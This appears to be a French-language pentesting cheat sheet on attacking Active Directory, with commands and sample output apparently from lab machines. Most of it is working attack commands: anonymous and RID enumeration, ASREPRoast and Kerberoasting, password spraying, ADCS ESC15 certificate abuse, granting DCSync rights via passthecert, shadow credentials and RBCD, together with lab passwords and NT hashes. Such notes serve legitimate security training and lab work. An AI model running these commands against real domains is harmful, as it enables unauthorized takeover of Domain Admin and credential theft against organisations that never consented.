---
title: Active Directory
description: Ce document regroupe des commandes et techniques pour l’énumération, l’exploitation et l’escalade de privilèges dans un environnement Active Directory (AD). Chaque section inclut des explications et des exemples tirés de machines que j'explore
layout: post
toc: true
---


#### Énumération initiale avec compte Guest ou anonyme

- **Objectif** : Tester l’accès anonyme ou avec le compte Guest pour identifier les informations accessibles sans authentification ou avec des privilèges minimaux.
    
- **Contexte** : Certaines configurations AD permettent un accès anonyme (par exemple, via SMB ou RPC) ou un compte `Guest` activé.
    
- **Outils** : `netexec`, `rpcclient`.
    
```bash
# Tester l’accès anonyme via SMB avec un utilisateur vide
netexec smb <IP> -u 'a' -p '' --rid-brute
# Exemple de résultat : Identifie si le compte Guest est accessible
# SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\a: (Guest)

# Énumérer les utilisateurs via RPC sans authentification
rpcclient <IP> -U '%' -c 'querydispinfo'
# Résultat : Liste les comptes du domaine si l’accès anonyme est permis

# Énumérer avec des identifiants valides (exemple : michael.wrightson)
rpcclient <IP> -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' -c 'querydispinfo'
# Résultat : Fournit des informations détaillées sur les utilisateurs du domaine
```

Notes :

- `--rid-brute` avec `netexec` tente de deviner les `SIDs` pour énumérer les utilisateurs.
    
- L’accès anonyme via RPC (`-U '%'`) peut être bloqué sur des systèmes modernes à moins que la configuration ne soit laxiste.
    
- Si des identifiants sont obtenus, utilisez-les pour approfondir l’énumération.
    

### Énumération des comptes sans mot de passe (ASREPRoast)

- **Objectif** : Identifier les comptes avec l’option `Do not require Kerberos preauthentication `pour récupérer des `TGTs` exploitables.
    
- **Outil** : `impacket-GetNPUsers`.
    
- **Contexte** : Utile pour trouver des comptes vulnérables à l’attaque `ASREPRoast`.
    

```bash
# Tester une liste d’utilisateurs sans mot de passe
impacket-GetNPUsers <DOMAIN>/ -usersfile <USER_LIST> -no-pass -dc-ip <IP>
# Exemple :
impacket-GetNPUsers cicada.htb/ -usersfile cicada.users -no-pass -dc-ip 10.10.11.35
# Résultat : Retourne les TGTs des comptes vulnérables, qui peuvent être cassés avec Hashcat
```

Notes :

- Créez un fichier machines.users avec une liste d’utilisateurs potentiels (par exemple, obtenus via `rpcclient` ou `ldapsearch`).
    
- Utilisez `hashcat` avec le mode `18200` (`Kerberos 5 AS-REP etype 23`) pour casser les hashes récupérés.
    

### Énumération LDAP

- **Objectif** : Récupérer des informations sur les objets AD (utilisateurs, groupes, ordinateurs) via LDAP.
    
- **Outils** : `rpcclient`, `ldapsearch`, `netexec`.
    
- **Contexte** : Nécessite souvent des identifiants valides pour interroger le serveur LDAP.
    

```bash
# Énumérer les informations d’affichage via RPC
rpcclient <IP> -U '%' -c 'querydispinfo'
# Avec identifiants
rpcclient <IP> -U '<USERNAME>%<PASSWORD>' -c 'querydispinfo'
# Exemple :
rpcclient 10.10.11.35 -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' -c 'querydispinfo'

# Énumérer les partages SMB pour identifier les accès
netexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' --shares
# Exemple :
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

**Notes** :

- `querydispinfo` via `rpcclient` liste les utilisateurs et leurs attributs si l’accès est autorisé.
    
- Pour une énumération `LDAP` plus détaillée, utilisez `ldapsearch` ou `BloodHound` avec des identifiants valides.
    

---

### Spraying de mots de passe

- **Objectif** : Tester un mot de passe commun sur plusieurs comptes pour identifier des identifiants valides.
    
- **Outil** : `netexec`.
    
- **Contexte** : Utile lorsque vous avez une liste d’utilisateurs et un mot de passe potentiel (par exemple, obtenu via une fuite ou une politique faible).
    

```bash
# Spraying avec une liste d’utilisateurs et un mot de passe commun
netexec smb <IP> -u <USER_LIST> -p '<PASSWORD>' --no-bruteforce
# Exemple :
netexec smb 10.10.11.35 -u cicada.users -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-bruteforce
# Résultat :
# SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
# SMB 10.10.11.35 445 CICADA-DC [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

Notes :

- `--no-bruteforce` teste chaque utilisateur avec le mot de passe spécifié, évitant le verrouillage des comptes.
    
- Créez machines.users avec les noms d’utilisateurs obtenus via `rpcclient` ou une autre méthode d’énumération.
    
- Soyez prudent avec le spraying pour éviter les verrouillages de compte (vérifiez la politique de verrouillage avec netexec `--pass-pol`).
    

---

### Exploitation des certificats ADCS

**Énumération des templates vulnérables**

- **Objectif** : Identifier les templates de certificats vulnérables (par exemple, `ESC1`, `ESC2`, `ESC3`, `ESC15`) pour exploiter des failles `ADCS`.
    
- **Outil** : `certipy-ad`.
    
- **Contexte** : Nécessite des identifiants valides pour interroger l’ADCS.
    

```bash
# Énumérer les templates vulnérables et sauvegarder la sortie
certipy-ad find -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <IP> -text -output <OUTPUT_FILE>
# Exemple :
certipy-ad find -u michael.wrightson@cicada.htb -p 'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35 -text -output vulnerable_cicada_user.txt

# Sauvegarder dans un fichier avec tee
certipy-ad find -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <IP> | tee -a <OUTPUT_FILE>
# Exemple :
certipy-ad find -u michael.wrightson@cicada.htb -p 'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35 | tee -a vuln.txt
```

Notes :

- Cherchez des templates avec `EnrolleeSuppliesSubject=True`, Client `Authentication=True`, ou` Schema Version=1` pour `ESC1`, `ESC3`, ou `ESC15`.
    
- Utilisez `-vulnerable` pour filtrer uniquement les templates exploitables :

    
    ```bash
    certipy-ad find -vulnerable -u michael.wrightson@cicada.htb -p 'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35
    ```
    

**Demander un certificat malveillant (ESC15)**

- **Objectif** : Exploiter un template vulnérable à `ESC15` (`CVE-2024-49019`) pour obtenir un certificat avec un `UPN` privilégié (par exemple, `Administrator`).
    
- **Contexte** : Nécessite des droits d’enrollment sur un template avec `EnrolleeSuppliesSubject=True` et `Schema Version=1`.
    

```bash
# Demander un certificat avec un UPN spécifique
certipy-ad req -u <USERNAME>@<DOMAIN> -p '<PASSWORD>' -dc-ip <IP> -ca <CA_NAME> -template <TEMPLATE> -upn <TARGET_UPN> -application-policies 'Client Authentication'
# Exemple :
certipy-ad req -u john@tombwatcher.htb -p 'aad3b435b51404eeaad3b435b51404ee:ad9324754583e3e42b55aad4d3b8d2bf' -dc-ip 10.129.249.14 -ca tombwatcher-CA-1 -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

Notes :

- `ESC15` exploite la possibilité d’ajouter Client Authentication via `-application-policies` sur des templates avec `Schema Version=1`.
    
- Vérifiez les droits d’enrollment avec `certipy-ad find` avant de demander un certificat.
    

**Authentification avec un certificat**

- **Objectif** : Utiliser un certificat pour s’authentifier et obtenir un accès privilégié.
    
- **Outil** : `certipy-ad auth`.
    

```bash
# Authentification avec un certificat PFX
certipy-ad auth -pfx <CERT_FILE> -dc-ip <IP> -ldap-shell
# Exemple :
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.249.14 -ldap-shell
# Dans l’interface LDAP :
add_user_to_group <USERNAME> "Domain Admins"
# Exemple :
add_user_to_group john "Domain Admins"
```

Notes :

- L’option` -ldap-shell` permet d’interagir directement avec l’AD pour modifier des objets (par exemple, ajouter un utilisateur à Domain Admins).
    
- Si l’authentification échoue, vérifiez les erreurs comme `KDC_ERR_PADATA_TYPE_NOSUPP`.
    

---

**Gestion des erreurs de certificat**

Erreur` KDC_ERR_PADATA_TYPE_NOSUPP`

- **Problème** : Cette erreur survient lorsque le KDC `ne` supporte pas le type de pré-authentification requis pour l’authentification par certificat (souvent liée à `PKINIT`).
    
- **Contexte** : Observé lors de l’utilisation de certipy-ad auth avec un certificat PFX.
    

```bash
# Exemple d’erreur
certipy-ad auth -pfx administrator.pfx -dc-ip 10.8.0.2
# Résultat :
# [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

- **Solution** : Convertir le certificat `PFX` en fichiers `.crt `(certificat) et `.key` (clé privée), puis utiliser `passthecert.py` pour effectuer des opérations `LDAP` (par exemple, accorder des droits `DCSync` ou ajouter un utilisateur à un groupe).
    

```bash
# Extraire le certificat sans la clé privée
certipy-ad cert -pfx <CERT_FILE> -nokey -out user.crt
# Exemple :
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt

# Extraire la clé privée sans le certificat
certipy-ad cert -pfx <CERT_FILE> -nocert -out user.key
# Exemple :
certipy-ad cert -pfx administrator.pfx -nocert -out user.key

# Accorder des droits DCSync à un utilisateur
python3 /path/to/passthecert.py -action modify_user -crt user.crt -key user.key -domain <DOMAIN> -dc-ip <IP> -target <TARGET_USER> -elevate
# Exemple :
python3 /path/to/passthecert.py -action modify_user -crt user.crt -key user.key -domain arkhaion.secdojo -dc-ip 10.8.0.2 -target administrator -elevate
# Résultat : Granted user 'administrator' DCSYNC rights!

# Accéder à une interface LDAP pour modifier des objets
python3 /path/to/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <DOMAIN> -dc-ip <IP>
# Exemple :
python3 /path/to/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain arkhaion.secdojo -dc-ip 10.8.0.2
# Dans l’interface LDAP :
add_user_to_group <USERNAME> "Domain Admins"
# Exemple :
add_user_to_group amelia.lopez "Domain Admins"
```

Notes :

- `passthecert.py` contourne l’erreur `KDC_ERR_PADATA_TYPE_NOSUPP` en utilisant le certificat pour des opérations `LDAP` directes plutôt que via Kerberos.
    
- Assurez-vous que le domaine et l’IP du DC sont corrects.
    
- Les droits `DCSync` permettent d’extraire tous les hashes du domaine avec secretsdump.py.
    

---

### Autres techniques utiles

**Kerberoasting**

- **Objectif** : Récupérer des `TGS` pour des comptes avec `SPN` et casser leurs hashes.
    
- **Outil** : `impacket-GetUserSPNs`.
    

```bash
# Récupérer les TGS pour les comptes avec SPN
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -request -dc-ip <IP>
# Exemple :
impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -request -dc-ip 10.129.249.14
# Casser le hash avec Hashcat
hashcat -m 13100 <TGS_HASH> <WORDLIST>
```

**Shadow Credentials**

- **Objectif** : Ajouter un certificat à un compte pour récupérer son hash `NTLM`.
    
- **Outil** : `pywhisker`.
    

```bash
# Ajouter un certificat Shadow Credentials
pywhisker.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <TARGET_USER> --action add
# Exemple :
pywhisker.py -d tombwatcher.htb -u sam -p 'Password1234' --target john --action add

# Obtenir un TGT avec le certificat
python3 /path/to/PKINITtools/gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> <DOMAIN>/<TARGET_USER> <CCACHE_FILE>
# Exemple :
python3 /path/to/PKINITtools/gettgtpkinit.py -cert-pfx CKfnfRX5.pfx -pfx-pass "e0nMa0ZPJqfOKXSwvGPi" tombwatcher.htb/john john.ccache

# Récupérer le hash NTLM
python3 /path/to/PKINITtools/getnthash.py -key <ASREP_KEY> <DOMAIN>/<TARGET_USER>
# Exemple :
python3 /path/to/PKINITtools/getnthash.py -key 9519c1710f8ecee765b9160811406fe0f935dd9b89e221b6efa95a5d68c1c9d9 tombwatcher.htb/john
```

### Resource-Based Constrained Delegation (RBCD)

- **Objectif** : Configurer un compte d’ordinateur pour s’authentifier en tant qu’un autre utilisateur.
    
- **Outils** : `addcomputer.py`, `rbcd.py`, `getST.py`.
    

```bash
# Créer un compte d’ordinateur
addcomputer.py <DOMAIN>/<USERNAME> -hashes :<NT_HASH> -dc-ip <IP> -computer-name <COMPUTER_NAME>$ -computer-pass <PASSWORD>
# Exemple :
addcomputer.py tombwatcher.htb/john -hashes :ad9324754583e3e42b55aad4d3b8d2bf -dc-ip 10.129.249.14 -computer-name attacker$ -computer-pass 'P@ssw0rd123'

# Configurer RBCD
rbcd.py -action write -from '<COMPUTER_NAME>$' -from-password '<PASSWORD>' -to '<TARGET>' -dc-ip <IP> <DOMAIN>/<USERNAME> -hashes :<NT_HASH>
# Exemple :
rbcd.py -action write -from 'attacker$' -from-password 'P@ssw0rd123' -to 'Administrator' -dc-ip 10.129.249.14 tombwatcher.htb/john -hashes :ad9324754583e3e42b55aad4d3b8d2bf

# Obtenir un ticket TGS
getST.py -spn cifs/<DC_HOST> -impersonate <TARGET> <DOMAIN>/<COMPUTER_NAME>$:<PASSWORD> -dc-ip <IP>
# Exemple :
getST.py -spn cifs/DC01.tombwatcher.htb -impersonate Administrator tombwatcher.htb/attacker$:P@ssw0rd123 -dc-ip 10.129.249.14
```

---

### Conseils généraux

- `BloodHound` : Utilisez `SharpHound` ou `rusthound` dès que possible pour cartographier les relations AD et identifier les chemins d’escalade.
    
    ```bash
    rusthound-ce -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -k -f <DC_HOST>
    ```
    
- Vérifiez les partages SMB : Cherchez des fichiers sensibles sur les partages accessibles.
    
    
    ```bash
    netexec smb <IP> -u <USERNAME> -p '<PASSWORD>' --shares
    ```
    
- Évitez les verrouillages : Vérifiez la politique de mot de passe avant le spraying :
    
    ```bash
    netexec smb <IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol
    ```
    